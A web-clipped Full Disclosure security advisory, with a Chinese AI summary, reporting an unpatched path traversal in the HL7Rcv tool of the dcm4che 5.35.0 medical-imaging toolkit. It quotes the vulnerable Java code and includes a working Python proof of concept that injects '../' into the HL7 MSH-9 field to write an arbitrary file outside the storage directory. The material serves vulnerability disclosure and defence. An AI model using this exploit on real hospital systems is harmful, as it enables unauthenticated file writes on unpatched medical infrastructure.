---
title: "Full Disclosure: [SYSS-2026-078]: dcm4che - Path Traversal (CWE-22)"
source: https://seclists.org/fulldisclosure/2026/Oct/23
source_host: seclists.org
clip_date: 2026-10-15T16:24:21+08:00
trace_id: 43b7ff9f-0ad7-4051-b9b8-e6ab000903f3
content_hash: 9a9ca1bc4920557cf86f61cb170416406d31a624e557e63fa076a7f41d4db5cd
status: synced
tags:
  - 漏洞分析
  - 协议分析
series: null
feed_source: Full Disclosure·漏洞披露
ai_summary: dcm4che 5.35.0 的 HL7Rcv 工具存在路径遍历漏洞（CWE-22），未认证攻击者可通过 HL7 MSH-9 字段写入任意文件，目前无官方修复。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3fa75244-d011-81b0-8c51-d688ddeed7c6
ioc:
  cves: []
  cwes:
    - CWE-22
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> dcm4che 5.35.0 的 HL7Rcv 工具存在路径遍历漏洞（CWE-22），未认证攻击者可通过 HL7 MSH-9 字段写入任意文件，目前无官方修复。
> 
> - **漏洞定位：** HL7Rcv.java:254-259 直接把 HL7 消息的 MSH-9（Message Type）当作目录名传给 `File` 构造器，未做路径净化。
> - **利用链：** MSH-9 注入 `../` 控制目录，MSH-10（Message Control ID）控制文件名，`storeToFile()`（271-280 行）调 `mkdirs()` 建目录后写入，全程无路径规范化或边界检查。
> - **触发方式：** HL7 MLLP 无认证，任意能访问 TCP 端口的网络位置都可攻击；原始 TCP 发送带 MLLP 帧头（SOM 0x0B / EOM 0x1C 0x0D）的合法 HL7 报文即可。
> - **PoC 要点：** Python 脚本向 `127.0.0.1:25018` 发送 MSH-9 为 `../outside_hl7`、MSH-10 为 `exploit.log` 的消息，文件落到 `/tmp/outside_hl7/exploit.log`，逃逸出配置目录 `/tmp/hl7storage` 一层。
> - **状态与时间线：** 风险等级 High，2026-08-06 与 09-04 两次通知厂商，2026-10-13 公开，CVE 未分配，厂商无安全更新。

## Full Disclosure mailing list archives

## \[SYSS-2026-078\]: dcm4che - Path Traversal (CWE-22)

* * *

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>  
*Date*: Thu, 15 Oct 2026 09:32:05 +0200  

* * *

```
Advisory ID:               SYSS-2026-078
Product:                   dcm4che
Manufacturer:              J4Care
Affected Version(s):       5.35.0
Tested Version(s):         5.35.0
```

Vulnerability Type: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

```yaml
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2026-08-06
Public Disclosure:         2026-10-13
CVE Reference:             Not yet assigned
Author of Advisory:        Matthias Deeg, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

```

dcm4che is a Java-based Digital Imaging and Communications in Medicine (DICOM) toolkit providing libraries and command-line utilities for processing, storing,

```kotlin
and transmitting DICOM data (see [1]).

The HL7Rcv command-line tool in dcm4che is vulnerable to a path traversal
attack. An attacker who can send HL7 MLLP messages to a running HL7Rcv
server can write arbitrary files outside the configured storage directory
by injecting "../" sequences into the HL7 MSH-9 (Message Type) field.

This allows unauthenticated remote attackers to achieve arbitrary file
write on the target system.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The HL7Rcv tool receives HL7 messages over the Minimal Lower Layer Protocol
(MLLP) via TCP. When a message is received and stored, the HL7 message type
field (MSH-9) is used directly as a directory name in a file constructor
without any path sanitization (see HL7Rcv.java:254-259):

  private UnparsedHL7Message onMessage(UnparsedHL7Message msg)
              throws Exception {
      if (storageDir != null)
          storeToFile(msg.data(), new File(
                  new File(storageDir, msg.msh().getMessageType()),
                          useUUIDForFilename
                                  ? UUID.randomUUID().toString()
                                  : msg.msh().getField(9, "_NULL_")));

The getMessageType() method (HL7Segment.java) returns the raw MSH-9 field
value verbatim. If an attacker sends an HL7 message where MSH-9 contains
path traversal sequences (e.g. "../outside"), the resulting file path
escapes the configured storage directory.

The storeToFile() method (HL7Rcv.java:271-280) then calls mkdirs() to
create the traversed directory structure and writes the file:

  private void storeToFile(byte[] data, File f) throws IOException {
      Connection.LOG.info("M-WRITE {}", f);
      f.getParentFile().mkdirs();
      try (FileOutputStream out = new FileOutputStream(f)) {
          out.write(data);
      }
  }

No path normalization or boundary check is performed.

The MSH-10 (Message Control ID) field is used as the leaf filename, so the
attacker controls both the traversal path (MSH-9) and the filename (MSH-10).

Because HL7 MLLP carries no authentication, this attack can be executed
from any network location with access to the HL7Rcv TCP port. A raw TCP
connection sending a well-formed HL7 message with the MLLP framing bytes
(SOM 0x0B / EOM 0x1C 0x0D) is sufficient.

The root cause is the missing validation of the MSH-9 field value before
it is used as a file path component.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

The path traversal can be demonstrated by sending a crafted HL7 message
over a raw TCP connection using the following Python script.

The storage directory (in this example "/tmp/hl7storage") has to be
created before starting hl7rcv and running the PoC exploit.

cat > poc.py << 'EOF'
#!/usr/bin/env python3
import socket, os

# Start hl7rcv: hl7rcv --directory /tmp/hl7storage -b 127.0.0.1:25018

# Malicious HL7 message with path traversal in MSH-9 (directory)
# and attacker-controlled filename in MSH-10 (Message Control ID)
hl7 = ("MSH|^~\\&|SEND|-|RECV|-|"
     "20240101000000||../outside_hl7|exploit.log|P|2.5\r"
     "PID|1||12345||Test^Patient\r")
mllp = b"\x0b" + hl7.encode("ascii") + b"\x1c\r"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 25018))
sock.sendall(mllp)
ack = sock.recv(4096)
sock.close()

# Verify: file written at /tmp/outside_hl7/exploit.log
print(os.path.exists("/tmp/outside_hl7/exploit.log"))
EOF

The file is written to /tmp/outside_hl7/exploit.log, one directory level
above the configured storage directory, confirming the path traversal.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

SySS GmbH is not aware of a security update for the described issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2026-08-06: Vulnerability reported to manufacturer
2026-09-04: Vulnerability reported to manufacturer again
2026-10-13: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] dcm4che project website
    https://www.dcm4che.org/
[2] SySS Security Advisory SYSS-2026-078
```

[https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-078.txt](https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2026-078.txt)

```
[3] SySS GmbH, SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Matthias Deeg of SySS GmbH with
the assistance of SySS AI.

E-Mail: matthias.deeg (at) syss.de
```

Public Key: [https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc](https://www.syss.de/fileadmin/dokumente/PGPKeys/Matthias_Deeg.asc)

```kotlin
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS
website.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 4.0
URL: https://creativecommons.org/licenses/by/4.0/deed.en

```

**Attachment: [OpenPGP_signature.asc](https://seclists.org/fulldisclosure/2026/Oct/att-23/OpenPGP_signature_asc.bin)**  
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```
